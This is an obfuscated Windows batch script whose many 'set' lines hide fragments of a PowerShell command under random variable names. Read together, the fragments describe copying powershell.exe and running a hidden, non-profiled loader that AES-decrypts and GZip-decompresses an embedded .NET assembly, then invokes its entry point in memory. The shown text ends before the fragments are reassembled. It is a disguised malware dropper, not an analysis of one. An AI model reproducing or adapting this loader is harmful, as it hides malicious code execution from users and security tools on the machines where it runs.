@echo off
set "WcVgSVBbjq=\W"
set "ddBcbLOUOb=em"
set "ZXDvRCXuVB=Sy"
set "KbhxHvhrIf= /"
set "ciEuxMANsY=nd"
set "wmkWEQzKzD=py"
set "OdGTDHUrtj=do"
set "zrtKGwNCdU=s\"
set "XHmjiAUkBB=Wi"
set "WJQcDTEDJG=y "
set "BQWRFatAJF=he"
set "YYJyYrejvH=32"
set "uODPQWvAtf=in"
set "kSCrsbhvjg=ws"
set "AHmtiYgjZQ=.e"
set "qBtfseLZCt=xe"
set "kNKxHkuUHc=Po"
set "dZLmuTieXU= C"
set "YixSnUoCuS=1."
set "LWtAXSwHQV=ll"
set "pHFnkUwQIy=ow"
set "UIRhtdBRdt=we"
set "rARFYsrGYd=rs"
set "bjHagClmwO=rS"
set "OaqnVasims=he"
set "VEPqTTvbDl=we"
set "FgRYeagJre=\v"
set "mZKrnGcmxz=ll"
set "MlZMSxMCiV=co"
set "LCPtogriqP=:\"
set "FDPsApbYYo=st"
set "AnPkZbzpNA=0\"
set "zYOXjIisiU=po"
set "gkWLXlFnTY=cd"
set "GMUucszxgJ= %~dp0"
set "MsaYPDQWOj=oint"
set "SNdYjnkGGy=kpw "
set "QYYlcbhTQg=uTLm"
set "LGcrvJyezx=lit("
set "DwthZaMzgA=ateD"
set "MaXgUvbszM=);$C"
set "lNOjtjOSAZ=);$n"
set "bRRLaiqcPs=)) {"
set "jrlmOmHShd=S46e"
set "ucJikucYlo=tS46"
set "RacvGGuDgz=ypto"
set "DesVZjXdkI=h.Pa"
set "ffONEOREGz=im ="
set "TIToRHhNfn=comp"
set "IsFKpGPxZO=m(, "
set "CrVHUwSCFc=ose("
set "zuLYprnIER=ptog"
set "OKAeUUEFvG=jufF"
set "SMBlJOvjhY=Lm);"
set "IYETPLvxvq=yste"
set "SYhwFlgFrw=$Ypk"
set "eeOdfcIjDA=Disp"
set "bBKDgrypvg= [st"
set "cjtVLyPNbD=em.I"
set "MEnjZYhNrK=ptor"
set "XQECOrHZoN=s.En"
set "raeFWlJybK=:('g"
set "WqqtSHIdSU=embl"
set "qlIcQgdiMu=XSEA"
set "ntaKlyamqb=s75K"
set "abtHwgbMwQ=ispo"
set "cmwPusHQPO=$EGN"
set "wdmktFmHoH=.Dis"
set "RlNnErSbuT=('%*'"
set "uSyHQZDfcK=.Mem"
set "ILaDYIJJrA= = $"
set "NQvGXxNjLq= = ["
set "zneQOhgRCU=yste"
set "WVLgIGrMnP=rity"
set "XtFQvIOBbd=orF'"
set "fXoQAxoPgD=grap"
set "DCUoPAlNxR=rt]:"
set "mYUvQmIeyg=6] -"
set "WMaDGtPhob=pres"
set "XkNdrobKGr=am;$"
set "JzTELJPAyE=$sqU"
set "AxrpuIBYPX=stem"
set "yywkmeGYDe=6esa"
set "qdxZdtrWMP=tem."
set "NrIWkFPGNl=Invo"
set "mVHEnjpokr=oArr"
set "PBhXEntRvs=em.C"
set "kMPQyaatim=tryP"
set "YNcqmQMuRg=] -j"
set "sbIBEyXoPS=$nuQ"
set "ySTUsefIzQ=.Dis"
set "CUncNBqfRR=Conv"
set "wNugRlEyfI=nage"
set "vgFHdKEIiC=[IO."
set "VHSKGnMbtt=nuQR"
set "SyLBzwPFCS=fF.D"
set "kaIsEQBdZJ=stem"
set "eqOofZvmsr=Jjuf"
set "uAcLBjwLVn=$huT"
set "muECvzFBDe=;$Me"
set "dRFPwsJckU=('Tg"
set "sjGqTgYORy=pose"
set "ooiUVCAFsw=uQRh"
set "oPJEAqVxdj=();$"
set "wPysUdoJdd=.Com"
set "okpKWuzWHq=Disp"
set "kVrSdbUchn=huTL"
set "IEfjOSzmZM=.GZi"
set "EbORIbzOll=$huT"
set "KysKILcNgu=ay()"
set "fhmASxwLIU=);$s"
set "SZZbIhrcHP=vert"
set "tuxggikDdR=rofi"
set "siOeCWRubA= New"
set "kGqbLakhPO=-Obj"
set "hxchZXPfwk=dj0C"
set "mvibzsWyYp=Secu"
set "tfXqsOJdtk=ment"
set "GDBVcaTqkS=)($M"
set "HuXhYEJGJX=[]] "
set "zbkSDsbkTN=th('"
set "MWeRjJIgHX=ptog"
set "iHEpqWxYjL=Obje"
set "ZOywZRPpbP=-joi"
set "MUwgGxBTwr=y]::"
set "lISOMVLsfZ=ck($"
set "sMoTmEEDFH=ing("
set "gMJhzPnVjX=$sqU"
set "NfmVYWWZZY=106u"
set "wuCnIZORRJ=[-1."
set "byfoJQJUxT=7;$n"
set "GHVuBeYAAW=n ''"
set "JmiaeLNOok= [Sy"
set "wVAPPGehHP=]::("
set "BsEtZxGuCA=ose("
set "DZeQCMLmgW=XSEA"
set "CqbqBNSoqC=hgs "
set "hWWalPCJpK=uTLm"
set "veHTFRreiN=yste"
set "kxdLMoLwDH=Stre"
set "SCEAkcXvIF=null"
set "vrAUUIipuc=New-"
set "LFYTdGwqvE=fXX."
set "DUQrbvZmMB=);$n"
set "iojCRwFoHD=tem."
set "RPkGSNcZFV===')"
set "oVAfqgcHiV='')("
set "XQCHFUPMee=Syst"
set "ePqnFHiHGi=Secu"
set "SCuYeVaUAV=;$EG"
set "MdJHFtrPkU=.Con"
set "mjfLDUDOBi=oryS"
set "XhGFlTobZf=Fina"
set "VVegfQQTYc=oL'["
set "vtnhrVGPLK=ion."
set "PayRbeMXcT=huTL"
set "NYHmrDEURu=Comp"
set "ElMiANlsfP=1] -"
set "vnuHQzutHr=fore"
set "WSyugoVakn=e]::"
set "WSgaufqOSc=[Env"
set "rDxahfkqPq='[-1"
set "mZIMruBbWQ=]::N"
set "HfCfuIvmrH=esaB"
set "NQcEpfDYuT=gjYA"
set "ycfYMBSvLD=iron"
set "bJuEqkqTWk=dXB."
set "ByoQnLiAZR=[Sys"
set "vyyQUgBURD=CFxo"
set "btKHRHRAON=-joi"
set "EwYRHFkYEm=Star"
set "SxMODKbfUU=yTo("
set "TIKgRpwizp=Q) {"
set "cdOpPKyXHU=.Cry"
set "DalgdRhxPH=;$CT"
set "BqlUDIkzRu= = $"
set "OWWKoRrxOu=g = "
set "kcnmEmlHSR=File"
set "TMbmPJnJkn=lBlo"
set "bMcffRwYkK='txe"
set "qDOATjOFVh=k; }"
set "pmkKIChNrg=PKCS"
set "nGyztiGLIA=($cZ"
set "xonyXqMFFu=uQRh"
set "QTpBaHhAvZ=-nop"
set "uXDurlbHJw=rtS4"
set "aQyUPylFUJ=ach "
set "EQqYIzAlsk=.-16"
set "NlzKNbbaxU=y.Pa"
set "wvOvRjwZjJ=ct S"
set "vvmVehheMp=L4Yi"
set "EivNeqpEJV=pose"
set "PJXdsYidpx=)($h"
set "bhbiEogIHy=BC;$"
set "kOxaCufoiO=m = "
set "XkhsrXgEDs=UQ ="
set "TgRUhddQVO=ionM"
set "thrktgFdfM=F = "
set "xgRJkKSuyB=RmAx"
set "CPfPeClgoo=  $M"
set "mgpRarGREW=and "
set "KedXCUEkXF=l5E7"
set "XRpUgPgvYD=;$Yp"
set "NhzaDQOGym=raph"
set "XfJukOLQiX=Mehg"
set "ySrPohIBfy=y.Ci"
set "cJeRdpMafE=zHhH"
set "pQfcNUVPTS=PTtG"
set "zHLwDtTTQo=EGNU"
set "aXQnfqXLAk=$Jju"
set "UTYMrHqYlc=comm"
set "TdksXeCgmt=huTL"
set "wXMEEfMoCJ=le  "
set "nHcrWfJLuV=).Sp"
set "zfNHWbYRag=.Cry"
set "DyTnnqnSqh=ode]"
set "yXQrxdLmxF=.Cre"
set "jtWEkUvPyb=$gcR"
set "fQihpqdzzu=[Sys"
set "hDVjyWOgiv=[Sys"
set "OApWwNVBUx= = N"
set "dWMaRHZRVM=-4] "
set "bFuDadNrPU=saBm"
set "XkfpvUEDjk=Mode"
set "ZcNgDteIvR=mory"
set "xCjQSYijhb=m = "
set "xzUDgDEmbD=.Mod"
set "mAAjebYXzc=.IO."
set "DXBFnUDNMZ=gMod"
set "dSWLgGSHBz=onve"
set "ohwmTaEygF=in $"
set "DOKgOtwbiU=m.Re"
set "ALtqvAAmBW=fXX "
set "tfySCZQTXZ=pher"
set "UhuEJdnKiJ=morF"
set "FQHWvzectS=F'[-"
set "PKoVlhcxvU=;$Yp"
set "sWipLsxzoI= [Sy"
set "uFscSroNQT=PxEW"
set "zNqoaThKWV=ss -"
set "URPseGCBuK='gni"
set "oUjlWsAIFw=e = "
set "rZsSPStoTl=hy.A"
set "DHaCVEQKnk=)))"
set "KoqyyfITFv=('da"
set "mXaEvlspVy=, (,"
set "DiRZDpoSSq=, $h"
set "kYZwblvioN=eam("
set "iUyaLgHiKm=::('"
set "PFpQXBqYWB=-1.."
set "GOlkqCPALC=ert]"
set "cYuBlUNbXl=cZfX"
set "ljLymsZxND=rans"
set "gsQCXeHCXp=join"
